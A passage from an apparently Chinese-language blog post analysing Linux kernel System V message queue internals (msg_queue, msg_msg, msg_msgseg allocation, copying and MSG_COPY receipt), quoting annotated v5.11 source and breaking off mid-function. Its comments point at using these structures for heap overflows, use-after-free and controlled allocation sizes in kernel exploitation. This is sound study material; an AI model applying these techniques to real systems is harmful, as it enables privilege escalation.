class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-内存分配与释放-2"   >
          <a href="#2-内存分配与释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-2" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①创建-3"   >
          <a href="#①创建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-3" class="headerlink" title="①创建"></a>①创建</h4>
      
        <h5 id="A-内存申请-1"   >
          <a href="#A-内存申请-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请-1" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <ul>
<li><p>还是需要先创建<code>msg_queue</code>结构体，使用<code>msgget</code>函数，调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注最后的<code>newque()</code>函数，在该函数中使用<code>kvmalloc()</code>申请堆块，大小为0x100，属于<code>kmalloc-256</code>，(不同版本大小貌似不同)。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个才是实际申请的堆块内存</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//进行相关注册</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面一堆看不懂在干啥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>创建的结构体如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//这些为一些相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF</span></span><br><span class="line">    <span class="comment">//和该消息队列里的所有消息组成双向循环链表</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>接着当使用<code>msgsnd</code>函数传递消息时，会创建新的<code>msg_msg</code>结构体，消息过长的话就会创建更多的<code>msg_msgseg</code>来存储更多的消息。相关的函数调用链如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注在<code>alloc_msg()</code>函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最大发送DATALEN_MSG长度的消息</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//这里的PAGE_SIZE为0x400,即最多kmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//使用正常</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。</span></span><br><span class="line">    <span class="comment">//使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。</span></span><br><span class="line">    <span class="comment">//最大也为0x400,也属于kmalloc-1024</span></span><br><span class="line">    <span class="comment">//还有再长的消息,就再申请msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//不知道干啥的</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//申请完之后,将msg_msgseg放到msg-&gt;next这个单向链表上</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>结构体如下，头部大小<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>结构如下，只是一个<code>struct msg_msgseg*</code>指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="相关内存结构："   >
          <a href="#相关内存结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关内存结构：" class="headerlink" title="相关内存结构："></a>相关内存结构：</h6>
      <p>在一个<code>msg_queue</code>队列下，消息长度为<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>一条消息：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>两条消息：</p>
<p>以<code>msg_queue</code>的<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p>
</li>
</ul>
<p>同理，同一个<code>msg_queue</code>消息队列下的多条消息也是类似的</p>

        <h6 id="内存申请总结：-1"   >
          <a href="#内存申请总结：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：-1" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li>使用<code>msgget()</code>函数创建内核空间的消息队列结构<code>msg_msgseg</code>，返回值为消息队列的<code>id</code>标志<code>queue_id</code><ul>
<li><code>msg_msgseg</code>管理整个消息队列，大小为0x100，<code>kmalloc-256</code>。</li>
<li>其<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</li>
</ul>
</li>
<li>每次在该消息队列<code>queue_id</code>下调用<code>msgsnd()</code>函数都会申请内核空间的<code>msg_msg</code>结构，消息长度大于<code>0x400-0x30</code>就会申请内核空间的<code>msg_msgseg</code>结构<ul>
<li><code>msg_msg</code>为每条消息存放消息数据的结构，与<code>msg_queue</code>形成双向循环链表，与<code>msg_msgseg</code>形成单向链表大小最大为0x400，属于<code>kmalloc-64</code>至<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>也为每条消息存放消息数据的结构，挂在<code>msg_msg</code>单向链表中，大小最大为<code>0x400</code>，属于<code>kmalloc-16</code>至<code>kmalloc-1024</code>，当消息长度很长时就会申请很多的内核空间的<code>msg_msgseg</code>结构。</li>
</ul>
</li>
</ul>

        <h5 id="B-数据复制-1"   >
          <a href="#B-数据复制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制-1" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>调用完<code>alloc_msg()</code>函数后，回到<code>load_msg()</code>函数接着进行数据复制，函数还是挺简单的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先复制进msg_msg中存放消息的部分</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历msg_msg下的msg_msgseg,逐个存放数据进去</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-4"   >
          <a href="#②释放-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-4" class="headerlink" title="②释放"></a>②释放</h4>
      <p>相关的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>首先关注一下<code>do_msgrcv()</code>函数，里面很多东西都比较重要</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了</span></span><br><span class="line">        <span class="comment">//不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除</span></span><br><span class="line">    <span class="comment">//只是释放堆块,在后续的代码中有显示</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//开始从msg_queue中寻找合适的msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//这个copy_msg()函数就是之前提到的在汇编层面就很奇怪</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            